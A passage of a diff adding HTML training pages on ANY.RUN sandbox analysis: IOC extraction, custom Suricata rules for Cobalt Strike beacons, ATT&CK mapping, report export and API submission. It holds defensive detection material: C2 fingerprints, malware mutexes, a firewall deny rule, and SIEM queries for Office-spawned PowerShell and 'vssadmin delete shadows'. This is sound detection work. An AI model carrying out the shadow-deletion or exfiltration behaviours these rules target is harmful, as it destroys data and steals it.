+ip.dst == 185.220.101.47 &amp;&amp; http.request.method == "POST"</code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 05 — IOC Extraction
+     ============================================================ -->
+<template id="tpl-ioc">
+  <h1>IOC Extraction</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">IOCs span all layers: L3 IPs and SSL certificate fingerprints, L4 destination ports, and L7 domains, URLs, DNS query patterns, file hashes, and registry keys.</span>
+  </div>
+  <p>ANY.RUN automatically extracts Indicators of Compromise from both network and host activity. IOCs can be exported in multiple formats for SIEM ingestion, MISP sharing, and detection rule creation.</p>
+
+  <h2>IOC Types Extracted</h2>
+  <table>
+    <tr><th>Category</th><th>IOC Type</th><th>Example</th></tr>
+    <tr><td>Network</td><td>IP address</td><td>185.220.101.47</td></tr>
+    <tr><td>Network</td><td>Domain</td><td>malicious-c2.example.com</td></tr>
+    <tr><td>Network</td><td>URL</td><td>https://malicious-c2.example.com/beacon/check</td></tr>
+    <tr><td>Network</td><td>SSL certificate SHA1</td><td>SHA1 fingerprint of C2 TLS certificate</td></tr>
+    <tr><td>Host</td><td>File SHA-256</td><td>Hash of dropped malware binaries</td></tr>
+    <tr><td>Host</td><td>File path</td><td><code>C:\Users\user\AppData\Roaming\updater.exe</code></td></tr>
+    <tr><td>Host</td><td>Registry key</td><td><code>HKCU\Software\Microsoft\Windows\Run\WindowsUpdate</code></td></tr>
+    <tr><td>Host</td><td>Mutex</td><td>Global\MSDCSC (DarkComet RAT mutex)</td></tr>
+    <tr><td>Host</td><td>Named pipe</td><td><code>\\.\pipe\mojo.5688.8052.197494759520304132</code></td></tr>
+    <tr><td>Host</td><td>Process injection</td><td>Source PID → target process name</td></tr>
+  </table>
+
+  <h2>Exporting IOCs</h2>
+  <p>From any completed task, open the <strong>IOC</strong> tab in the analysis report:</p>
+  <table>
+    <tr><th>Export Format</th><th>Use Case</th></tr>
+    <tr><td>JSON</td><td>API integration, SOAR playbook input</td></tr>
+    <tr><td>CSV</td><td>Spreadsheet analysis, bulk import</td></tr>
+    <tr><td>STIX 2.1</td><td>MISP, OpenCTI, threat intelligence platform sharing</td></tr>
+    <tr><td>MISP Event</td><td>Direct push to MISP instance via API</td></tr>
+    <tr><td>Plain Text</td><td>Quick copy for manual firewall/IPS block list</td></tr>
+    <tr><td>OpenIOC</td><td>Legacy format for Mandiant tools</td></tr>
+  </table>
+
+  <h2>IOC Quality Assessment</h2>
+  <p>Not all IOCs from sandbox analysis have equal operational value:</p>
+  <table>
+    <tr><th>IOC Quality</th><th>Characteristics</th><th>Confidence</th></tr>
+    <tr><td>High</td><td>Mutex name, C2 SSL fingerprint, unique file hash, unique registry key</td><td>High — very specific to this malware family</td></tr>
+    <tr><td>Medium</td><td>C2 domain, dropped file path pattern, process injection target</td><td>Medium — may vary across samples</td></tr>
+    <tr><td>Low</td><td>C2 IP address (shared infra), generic file paths, common port</td><td>Low — shared infra, high false positive risk</td></tr>
+  </table>
+
+  <h2>Mutex as a High-Value IOC</h2>
+  <pre><code># Mutexes are named objects created by malware to prevent double-infection
+# They are highly specific and rarely change across C2 infrastructure
+
+# ANY.RUN shows mutexes in: Process Details → Misc → Mutants
+
+# Known mutex examples:
+Global\MSDCSC        # DarkComet RAT
+Global\_x_X_RASFSTSG_X_x_  # Gh0st RAT
+{ mutex_guid }       # Often GUIDs in modern loaders
+
+# Suricata rule from mutex (via Named Pipes or HTTP C2 check-ins):
+# alert tcp any any -> any any (msg:"Known RAT Mutex HTTP";
+#   content:"MSDCSC"; sid:9000001; rev:1;)</code></pre>
+
+  <h2>SSL Certificate Fingerprinting</h2>
+  <pre><code># Cobalt Strike default TLS certificate fingerprint (pre-4.0):
+# SHA-1: 6ECE5ECE4192683D2D84E25B0BA7E04F9CB7EB7C
+# This is the default self-signed cert many operators never change
+
+# ANY.RUN captures TLS handshake → JA3/JA3S fingerprints
+# JA3: client TLS fingerprint (browser/malware specific)
+# JA3S: server TLS fingerprint (C2 specific)
+
+# JA3 Cobalt Strike default: 72a7c4f499544b6a60e26ccee7c63e74
+# Use in SIEM: index=* ja3=72a7c4f499544b6a60e26ccee7c63e74</code></pre>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('suricata'); return false;">Suricata Correlation ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('api'); return false;">API Integration ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Understanding IOC Types and Layers</h4>
+      <ul>
+        <li>L3 IOCs: IP addresses — useful but shared infra makes them lower confidence</li>
+        <li>L4 IOCs: destination ports — confirm protocol (SMTP on 587 = email exfil, 4444 = likely C2)</li>
+        <li>L7 IOCs: domains, URLs, SSL fingerprints, file hashes, mutexes — highest confidence and specificity</li>
+        <li>Export IOCs as plain text for quick firewall block lists, or STIX 2.1 for MISP/OpenCTI sharing</li>
+      </ul>
+      <pre><code><span class="cm"># IOC confidence hierarchy:</span>
+<span class="cm"># HIGH: mutex, SSL cert SHA1, unique file hash, unique registry key</span>
+<span class="cm"># MED:  C2 domain, dropped file path pattern</span>
+<span class="cm"># LOW:  C2 IP address (shared hosting, bulletproof providers)</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Extracting High-Value Network IOCs</h4>
+      <ul>
+        <li>JA3 fingerprints identify the TLS client library — malware using default Cobalt Strike TLS has a known JA3 value</li>
+        <li>JA3S fingerprints identify the C2 server's TLS stack — unique and stable even when the L3 IP changes</li>
+        <li>SSL certificate SHA1 fingerprints (especially self-signed C2 certs) are extremely specific IOCs</li>
+      </ul>
+      <pre><code><span class="cm"># JA3 Cobalt Strike default client fingerprint:</span>
+ja3 = 72a7c4f499544b6a60e26ccee7c63e74
+
+<span class="cm"># Splunk SIEM hunt using JA3:</span>
+index=network ja3=72a7c4f499544b6a60e26ccee7c63e74
+| stats count by src_ip, dest_ip, dest_port</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>IOC Enrichment and Campaign Pivoting</h4>
+      <ul>
+        <li>Use mutex names to search ANY.RUN's public task database — find all related samples sharing the same mutex across campaigns</li>
+        <li>Push extracted STIX 2.1 IOCs to MISP and correlate with existing events to identify overlapping infrastructure</li>
+        <li>Combine JA3S + SSL cert fingerprint + L3 IP range to build multi-attribute SIEM detections with minimal false positives</li>
+      </ul>
+      <pre><code><span class="cm"># Multi-attribute SIEM detection (ELK KQL):</span>
+tls.client.ja3: "72a7c4f499544b6a60e26ccee7c63e74" AND
+destination.port: (8443 OR 4443 OR 443) AND
+NOT destination.ip: (known_cdn_ranges)
+
+<span class="cm"># Pivot via mutex in ANY.RUN public search:</span>
+<span class="cm"># app.any.run/submissions → filter by mutex → Global\MSDCSC</span>
+<span class="cm"># Find all related DarkComet samples and their C2 IPs</span></code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 06 — Suricata & Snort Rule Correlation
+     ============================================================ -->
+<template id="tpl-suricata">
+  <h1>Suricata &amp; Snort Rule Correlation</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Suricata inspects L3 IP headers, L4 TCP/UDP port and flow state, and L7 application content (HTTP URI, cookies, DNS queries, TLS certificates) to match rules against captured traffic.</span>
+  </div>
+  <p>ANY.RUN runs Suricata against all captured network traffic in real time. Rule matches appear in the <strong>Threats</strong> panel. You can also write new rules based on observed traffic patterns and test them instantly.</p>
+
+  <h2>Threats Panel</h2>
+  <p>The Threats tab shows every Suricata rule match with:</p>
+  <ul>
+    <li><strong>Rule SID</strong> — unique rule identifier</li>
+    <li><strong>Rule Name / Message</strong> — e.g., "ET TROJAN Cobalt Strike Beacon"</li>
+    <li><strong>Severity</strong> — Low / Medium / High / Critical</li>
+    <li><strong>Protocol</strong> — TCP, UDP, HTTP, DNS, TLS</li>
+    <li><strong>Source/Destination</strong> — IP:port pairs</li>
+    <li><strong>Timestamp</strong> — when in the analysis the rule fired</li>
+  </ul>
+
+  <h2>Suricata Rule Sets Used by ANY.RUN</h2>
+  <table>
+    <tr><th>Rule Set</th><th>Coverage</th></tr>
+    <tr><td>Emerging Threats (ET)</td><td>Known C2, malware families, exploit traffic</td></tr>
+    <tr><td>ET Pro</td><td>Premium ET rules — higher fidelity, more families</td></tr>
+    <tr><td>Snort Community</td><td>Community-maintained generic threat rules</td></tr>
+    <tr><td>Snort Registered</td><td>Registered-user Snort rules (delayed release)</td></tr>
+  </table>
+
+  <h2>Reading a Suricata Alert</h2>
+  <pre><code># ANY.RUN Threats panel — example alert:
+# SID: 2403342
+# Message: ET TROJAN Win32/AgentTesla Keylogger Data Exfil via SMTP
+# Severity: Critical
+# Protocol: TCP / SMTP
+# Src: 10.0.2.15:49827 → Dst: 185.220.101.47:587
+# Timestamp: +00:00:47
+
+# This tells us:
+# - AgentTesla keylogger is exfiltrating data via SMTP
+# - Destination IP 185.220.101.47 on port 587 (mail submission)
+# - Occurred 47 seconds into analysis
+
+# Block in firewall:
+# Rule: deny tcp any any -> 185.220.101.47 587</code></pre>
+
+  <h2>Writing Custom Suricata Rules from ANY.RUN Observations</h2>
+  <pre><code># 1. Identify unique HTTP request pattern from ANY.RUN HTTP tab:
+#    URI: /jquery-3.3.1.slim.min.js
+#    Cookie header starts with "__cfduid=d"
+#    Interval: every 60 seconds
+
+# 2. Write Suricata rule:
+alert http $HOME_NET any -> $EXTERNAL_NET any (
+  msg:"Cobalt Strike Default Beacon URI";
+  flow:established,to_server;
+  http.uri;
+  content:"/jquery-3.3.1.slim.min.js";
+  http.cookie;
+  content:"__cfduid=d";
+  classtype:trojan-activity;
+  sid:9000001;
+  rev:1;
+)
+
+# 3. Validate rule syntax:
+suricata -T -c /etc/suricata/suricata.yaml -S custom.rules
+
+# 4. Test against downloaded PCAP:
+suricata -r analysis.pcap -l /tmp/suricata_out/ -S custom.rules
+cat /tmp/suricata_out/fast.log</code></pre>
+
+  <h2>Converting Suricata Alerts to SIEM Queries</h2>
+  <pre><code># If Suricata alerts are in SIEM (Security Onion / ELK):
+
+# Elastic (KQL) — search for alert SID:
+rule.id: 2403342
+
+# Splunk — search for alert category:
+source="suricata" alert.category="trojan-activity"
+
+# Security Onion — KQL in Kibana Discover:
+event.dataset:suricata AND suricata.eve.alert.signature_id:2403342</code></pre>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('network'); return false;">Network Activity ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('attack'); return false;">ATT&CK Mapping ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Reading Suricata Alerts in the Threats Panel</h4>
+      <ul>
+        <li>Each alert shows Rule SID, message, severity, protocol, and source/destination IP:port</li>
+        <li>Severity Critical = confirmed malicious traffic family (ransomware exfil, RAT beacon, etc.)</li>
+        <li>The L3/L4 source and destination in the alert identifies the exact malware process and C2 server</li>
+        <li>ET (Emerging Threats) rules cover most known malware families — match against L7 content signatures</li>
+      </ul>
+      <pre><code><span class="cm"># Reading a Suricata alert from ANY.RUN Threats panel:</span>
+<span class="cm"># SID: 2403342</span>
+<span class="cm"># Message: ET TROJAN AgentTesla Keylogger Exfil via SMTP</span>
+<span class="cm"># Severity: Critical</span>
+<span class="cm"># Src: 10.0.2.15:49827 → Dst: 185.220.101.47:587 (L3+L4)</span>
+<span class="cm"># → Block: deny tcp any any -> 185.220.101.47 587</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Writing Custom Suricata Rules from ANY.RUN Observations</h4>
+      <ul>
+        <li>Identify unique L7 HTTP URI patterns, cookie values, or User-Agent strings from the HTTP panel</li>
+        <li>Write a Suricata rule targeting the unique L7 content — more specific than L3 IP-only blocks</li>
+        <li>Test the rule against the downloaded PCAP using <code>suricata -r</code> before deploying to production</li>
+      </ul>
+      <pre><code><span class="cm"># Write and test a custom rule:</span>
+alert http $HOME_NET any -> $EXTERNAL_NET any (
+  msg:"Custom C2 Beacon URI";
+  flow:established,to_server;
+  http.uri; content:"/gate.php";
+  http.method; content:"POST";
+  classtype:trojan-activity; sid:9000002; rev:1;
+)
+<span class="cm"># Test against PCAP:</span>
+suricata -r analysis.pcap -l /tmp/out/ -S custom.rules &amp;&amp; cat /tmp/out/fast.log</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Suricata-to-SIEM Pipeline and Rule Tuning</h4>
+      <ul>
+        <li>Convert ANY.RUN Suricata SIDs directly to SIEM detection rules — correlate SID matches with process and endpoint telemetry</li>
+        <li>Use Security Onion with Suricata to replay ANY.RUN PCAPs in your lab and validate detections before production deployment</li>
+        <li>Build layered rules: L3 IP match → L4 port confirmation → L7 content match for near-zero false positives</li>
+      </ul>
+      <pre><code><span class="cm"># Security Onion / ELK — correlate Suricata SID with process data:</span>
+event.dataset:suricata AND suricata.eve.alert.signature_id:2403342
+<span class="cm"># Then pivot: find source IP in endpoint telemetry</span>
+<span class="cm"># (Elastic Security → Hosts → match src_ip)</span>
+
+<span class="cm"># Splunk multi-source correlation:</span>
+index=suricata alert.signature_id=2403342
+| join src_ip [search index=endpoint process_name=*]
+| table src_ip, process_name, dest_ip, dest_port</code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 07 — MITRE ATT&CK Technique Mapping
+     ============================================================ -->
+<template id="tpl-attack">
+  <h1>MITRE ATT&amp;CK Technique Mapping</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">ATT&CK technique mapping operates at L7 — behaviors like process execution, API calls, scripting, and network C2 protocols are all application-layer events mapped to adversary techniques.</span>
+  </div>
+  <p>ANY.RUN automatically maps observed behaviors to MITRE ATT&CK techniques and displays them in a heat-map style matrix. This accelerates threat intel reporting and SIEM detection development.</p>
+
+  <h2>ATT&CK Panel</h2>
+  <p>Click the <strong>ATT&CK</strong> tab in any completed task to see:</p>
+  <ul>
+    <li>Highlighted tactics (columns) and techniques (cells) observed in the sample</li>
+    <li>Confidence level per technique (detected vs. inferred)</li>
+    <li>Technique name, ID, and sub-technique ID</li>
+    <li>Evidence — which process/API/network event triggered the mapping</li>
+  </ul>
+
+  <h2>Common Technique Observations</h2>
+  <table>
+    <tr><th>ATT&CK ID</th><th>Technique</th><th>ANY.RUN Evidence Source</th></tr>
+    <tr><td>T1059.001</td><td>PowerShell execution</td><td>powershell.exe spawned by Office app</td></tr>
+    <tr><td>T1059.005</td><td>VBScript</td><td>wscript.exe / cscript.exe spawned</td></tr>
+    <tr><td>T1055.001</td><td>DLL injection</td><td>WriteProcessMemory + CreateRemoteThread API sequence</td></tr>
+    <tr><td>T1055.012</td><td>Process hollowing</td><td>CreateProcess (suspended) + NtUnmapViewOfSection</td></tr>
+    <tr><td>T1071.001</td><td>HTTP C2</td><td>Periodic HTTP requests to non-standard host</td></tr>
+    <tr><td>T1071.004</td><td>DNS C2</td><td>High-volume TXT record queries to suspicious domains</td></tr>
+    <tr><td>T1027</td><td>Obfuscated Files/Info</td><td>Base64/XOR encoded payload in script</td></tr>
+    <tr><td>T1486</td><td>Data Encrypted for Impact</td><td>Mass file encryption via CryptEncrypt API + extension change</td></tr>
+    <tr><td>T1490</td><td>Inhibit System Recovery</td><td>vssadmin.exe delete shadows command</td></tr>
+    <tr><td>T1547.001</td><td>Registry Run Keys</td><td>RegSetValue to HKCU\...\Run</td></tr>
+    <tr><td>T1562.001</td><td>Disable Security Tools</td><td>sc.exe stop WinDefend or registry modification</td></tr>
+    <tr><td>T1140</td><td>Deobfuscate/Decode</td><td>CryptDecrypt or custom XOR decoding routine</td></tr>
+    <tr><td>T1082</td><td>System Information Discovery</td><td>GetComputerName, GetVersion, systeminfo.exe</td></tr>
+    <tr><td>T1083</td><td>File and Directory Discovery</td><td>FindFirstFile/FindNextFile looping all directories</td></tr>
+  </table>
+
+  <h2>Exporting ATT&CK Data</h2>
+  <pre><code># ANY.RUN → ATT&CK tab → Export
+# Formats: JSON (Navigator format), CSV
+
+# MITRE ATT&CK Navigator — load exported JSON:
+# navigator.attack.mitre.org → Open Existing Layer → Upload
+
+# Include in MISP event:
+# Tag event with MITRE galaxy tags:
+# misp-galaxy:mitre-attack-pattern="Process Injection - T1055"</code></pre>
+
+  <h2>Using ATT&CK Mappings for Detection Development</h2>
+  <p>Each identified technique suggests specific detections to build in your SIEM:</p>
+  <table>
+    <tr><th>Technique</th><th>SIEM Detection Approach</th></tr>
+    <tr><td>T1059.001 — PowerShell</td><td>Alert on powershell.exe with parent = Office app</td></tr>
+    <tr><td>T1218.010 — Regsvr32</td><td>Alert on regsvr32.exe /s /u /i: with network download</td></tr>
+    <tr><td>T1490 — Shadow Delete</td><td>Alert on process: vssadmin.exe with args delete shadows</td></tr>
+    <tr><td>T1055 — Process Injection</td><td>Alert on WriteProcessMemory to remote process</td></tr>
+    <tr><td>T1071.004 — DNS C2</td><td>Alert on DNS TXT queries to new domains; high NX rate</td></tr>
+  </table>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('ioc'); return false;">IOC Extraction ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('report'); return false;">Report Export ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Reading the ATT&CK Heat Map</h4>
+      <ul>
+        <li>Highlighted tactics (columns) and techniques (cells) show what adversary behaviors were observed</li>
+        <li>L7 application-layer behaviors like PowerShell execution, HTTP C2, and DNS tunneling all map to specific ATT&CK techniques</li>
+        <li>Each technique includes evidence — the specific process, API call, or network event that triggered it</li>
+        <li>Use ATT&CK IDs in incident reports to provide standardized, vendor-neutral threat characterization</li>
+      </ul>
+      <pre><code><span class="cm"># Key ATT&CK techniques commonly observed in ANY.RUN:</span>
+T1059.001 <span class="cm"># PowerShell — Office macro spawns powershell.exe</span>
+T1071.001 <span class="cm"># HTTP C2 — periodic POST to gate.php</span>
+T1486     <span class="cm"># Data Encrypted for Impact — ransomware via CryptEncrypt</span>
+T1547.001 <span class="cm"># Registry Run Keys — persistence via HKCU\...\Run</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Translating ATT&CK Techniques to SIEM Detections</h4>
+      <ul>
+        <li>T1059.001 (PowerShell): alert when powershell.exe parent process is an Office application</li>
+        <li>T1490 (Shadow Delete): alert on vssadmin.exe with "delete shadows" arguments — ransomware preparation</li>
+        <li>T1071.004 (DNS C2): alert on high rate of DNS TXT queries to newly registered domains with NXDOMAIN responses</li>
+      </ul>
+      <pre><code><span class="cm"># Splunk detection for T1059.001 (PowerShell via Office parent):</span>
+index=endpoint process_name=powershell.exe
+| where parent_process IN ("WINWORD.EXE","EXCEL.EXE","POWERPNT.EXE")
+| stats count by host, parent_process, command_line
+
+<span class="cm"># T1490 shadow copy deletion detection:</span>
+index=endpoint process_name=vssadmin.exe command_line="*delete shadows*"
+| alert on any match</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Navigator Export and Detection Engineering</h4>
+      <ul>
+        <li>Export ATT&CK data as Navigator JSON and load into navigator.attack.mitre.org to visualize coverage gaps</li>
+        <li>Overlay campaign ATT&CK coverage against your current SIEM detection coverage to identify blind spots</li>
+        <li>Push ATT&CK technique tags to MISP events using galaxy tags for community correlation</li>
+      </ul>
+      <pre><code><span class="cm"># Export ATT&CK Navigator layer from ANY.RUN:</span>
+<span class="cm"># Task → ATT&CK tab → Export → JSON (Navigator format)</span>
+<span class="cm"># Load at: navigator.attack.mitre.org → Open Existing Layer → Upload</span>
+
+<span class="cm"># MISP galaxy tag format for ATT&CK technique:</span>
+<span class="cm"># misp-galaxy:mitre-attack-pattern="Process Injection - T1055"</span>
+<span class="cm"># misp-galaxy:mitre-attack-pattern="PowerShell - T1059.001"</span></code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 08 — Report Export
+     ============================================================ -->
+<template id="tpl-report">
+  <h1>Report Export</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Reports are delivered via the L7 HTTPS web interface and API; the report content itself covers all layers — L3 IPs, L4 ports, and L7 domains/URLs/hashes extracted during analysis.</span>
+  </div>
+  <p>ANY.RUN generates comprehensive shareable reports for each analysis task. Reports can be shared via public URL or exported in multiple formats for documentation and intelligence sharing.</p>
+
+  <h2>Report Sections</h2>
+  <table>
+    <tr><th>Section</th><th>Contents</th></tr>
+    <tr><td>Task Summary</td><td>File name, SHA-256, MD5, file type, submission time, verdict</td></tr>
+    <tr><td>Process Graph</td><td>Visual process tree with parent-child relationships</td></tr>
+    <tr><td>Process Details</td><td>Per-process: command line, API calls, file/registry ops, network connections</td></tr>
+    <tr><td>Network Activity</td><td>HTTP requests, DNS queries, connections, Suricata alerts</td></tr>
+    <tr><td>IOC List</td><td>All extracted indicators (IPs, domains, hashes, paths, mutexes)</td></tr>
+    <tr><td>ATT&CK Mapping</td><td>Heat map + technique list with evidence</td></tr>
+    <tr><td>File Drops</td><td>Files written to disk during analysis with hashes</td></tr>
+    <tr><td>Signatures</td><td>Behavioral signature matches (ANY.RUN's own detection rules)</td></tr>
+    <tr><td>Screenshots</td><td>Periodic screenshots of the analysis VM desktop</td></tr>
+    <tr><td>PCAP</td><td>Full packet capture download</td></tr>
+  </table>
+
+  <h2>Verdict Levels</h2>
+  <table>
+    <tr><th>Verdict</th><th>Meaning</th></tr>
+    <tr><td>No threats detected</td><td>Sample ran without triggering any detection — may still be malicious (evasion)</td></tr>
+    <tr><td>Suspicious activity</td><td>Behavioral indicators present but below malicious threshold</td></tr>
+    <tr><td>Malicious activity</td><td>Confirmed malicious behavior or known malware family detected</td></tr>
+  </table>
+
+  <div class="callout warn">
+    <strong>Never Trust a "Clean" Verdict Alone</strong> — Sophisticated malware detects sandboxes and stays dormant. A "no threats detected" verdict with 60-second analysis duration is not clearance. Extend analysis time and use interactive execution to defeat evasion.
+  </div>
+
+  <h2>Sharing Reports</h2>
+  <pre><code># Any.RUN task URL format:
+app.any.run/tasks/[task-uuid]
+
+# Example: app.any.run/tasks/4e34b7d2-b3c5-4e8d-9bc9-1a2b3c4d5e6f
+# Share this URL with your team or attach to JIRA/case ticket
+# Public tasks are searchable by hash at: app.any.run/submissions/</code></pre>
+
+  <h2>Exporting for Documentation</h2>
+  <pre><code># Full JSON report export (paid):
+# Report page → Export → JSON
+# Contains all IOCs, ATT&CK mappings, process data in machine-readable format
+
+# Embed in IR report:
+# - Screenshot of process tree (highlight red processes)
+# - Screenshot of ATT&CK matrix heat map
+# - Table of IOCs from export
+# - Suricata rule match summary
+
+# Push to MISP:
+# IOC tab → Export → MISP Event
+# Imports event with all attributes pre-populated</code></pre>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('api'); return false;">API Integration ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('attack'); return false;">ATT&CK Mapping ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Understanding Report Sections and Verdicts</h4>
+      <ul>
+        <li>The Task Summary shows file hash (SHA-256/MD5), file type, and the final verdict (no threats / suspicious / malicious)</li>
+        <li>Never trust a "no threats detected" verdict without verifying analysis duration — 60 seconds is insufficient for time-bomb malware</li>
+        <li>The Process Graph gives a visual overview of the infection chain; red nodes are confirmed malicious</li>
+        <li>The IOC List aggregates all L3 IPs, L4 port data, and L7 domains/URLs/hashes in one exportable view</li>
+      </ul>
+      <pre><code><span class="cm"># Share a completed task report URL with your team:</span>
+app.any.run/tasks/4e34b7d2-b3c5-4e8d-9bc9-1a2b3c4d5e6f
+<span class="cm"># Attach to JIRA/case ticket for incident documentation</span>
+<span class="cm"># Public tasks searchable by SHA-256: app.any.run/submissions/</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Exporting Reports for Incident Response</h4>
+      <ul>
+        <li>Embed the process tree screenshot (highlighting red processes) and ATT&CK heat map in incident reports for executive briefings</li>
+        <li>Export full JSON report (paid) for machine-readable integration with SOAR playbooks and case management systems</li>
+        <li>Download the PCAP for additional Wireshark/Zeek analysis outside the ANY.RUN platform</li>
+      </ul>
+      <pre><code><span class="cm"># IR report content checklist from ANY.RUN:</span>
+<span class="cm"># [ ] Screenshot: process tree (red = malicious)</span>
+<span class="cm"># [ ] Screenshot: ATT&CK heat map</span>
+<span class="cm"># [ ] Table: IOC list (L3 IPs, L7 domains, file hashes)</span>
+<span class="cm"># [ ] Suricata alert summary (SID, message, severity)</span>
+<span class="cm"># [ ] Task URL for team access</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Automated Report Ingestion and MISP Push</h4>
+      <ul>
+        <li>Push IOC exports directly to MISP using the built-in MISP Event export — attributes are pre-populated with correct types</li>
+        <li>Integrate the JSON report export into SOAR workflows to auto-enrich alerts with process tree data and ATT&CK mappings</li>
+        <li>Use PCAP downloads in CI/CD detection pipelines: replay in Suricata/Zeek to validate new detection rules against real malware traffic</li>
+      </ul>
+      <pre><code><span class="cm"># Push IOCs to MISP from ANY.RUN report:</span>
+<span class="cm"># IOC tab → Export → MISP Event → copy JSON</span>
+<span class="cm"># MISP → Add Event → Import → paste JSON</span>
+<span class="cm"># Result: event with ip-dst, domain, url, file|sha256, mutex attributes</span>
+
+<span class="cm"># Replay PCAP to validate detection rules:</span>
+suricata -r anyrun_analysis.pcap -l /var/log/suricata/ -S new_rules.rules
+zeek -r anyrun_analysis.pcap</code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 09 — API Integration
+     ============================================================ -->
+<template id="tpl-api">
+  <h1>API Integration</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">The ANY.RUN REST API communicates over L7 HTTPS — all requests use TLS-secured HTTP with JSON payloads for sample submission, task polling, IOC retrieval, and PCAP download.</span>
+  </div>
+  <p>ANY.RUN provides a REST API for automated sample submission, task management, and IOC retrieval. Ideal for SOAR playbooks, SIEM enrichment, and threat intelligence pipelines. API access requires a paid subscription.</p>
+
+  <h2>API Authentication</h2>
+  <pre><code># API Key: generated in account settings → API
+# Pass as header:
+Authorization: API-Key YOUR_API_KEY_HERE
+
+# Base URL:
+https://api.any.run/v1/</code></pre>
+
+  <h2>Key API Endpoints</h2>
+  <table>
+    <tr><th>Endpoint</th><th>Method</th><th>Function</th></tr>
+    <tr><td><code>/analysis</code></td><td>POST</td><td>Submit file or URL for analysis</td></tr>
+    <tr><td><code>/analysis/{taskId}</code></td><td>GET</td><td>Get task status and summary</td></tr>
+    <tr><td><code>/analysis/{taskId}/summary/json</code></td><td>GET</td><td>Full JSON report</td></tr>
+    <tr><td><code>/analysis/{taskId}/ioc</code></td><td>GET</td><td>IOC list for a task</td></tr>
+    <tr><td><code>/analysis/{taskId}/pcap</code></td><td>GET</td><td>Download PCAP</td></tr>
+    <tr><td><code>/environment</code></td><td>GET</td><td>List available analysis environments</td></tr>
+    <tr><td><code>/user/limits</code></td><td>GET</td><td>Check remaining API credits/limits</td></tr>
+  </table>
+
+  <h2>Submit a File for Analysis</h2>
+  <pre><code>curl -X POST https://api.any.run/v1/analysis \
+  -H "Authorization: API-Key YOUR_KEY" \
+  -F "file=@/path/to/malware.exe" \
+  -F "env_os=windows" \
+  -F "env_version=10" \
+  -F "env_bitness=64" \
+  -F "opt_timeout=120" \
+  -F "opt_network_connect=true" \
+  -F "obj_type=file"</code></pre>
+
+  <h2>Submit a URL</h2>
+  <pre><code">curl -X POST https://api.any.run/v1/analysis \
+  -H "Authorization: API-Key YOUR_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "obj_type": "url",
+    "obj_url": "https://suspicious-phishing-site.example.com/invoice.html",
+    "env_os": "windows",
+    "env_version": "10",
+    "opt_timeout": 60,
+    "opt_network_connect": true
+  }'</code></pre>
+
+  <h2>Python Integration Example</h2>
+  <pre><code">import requests
+import time
+
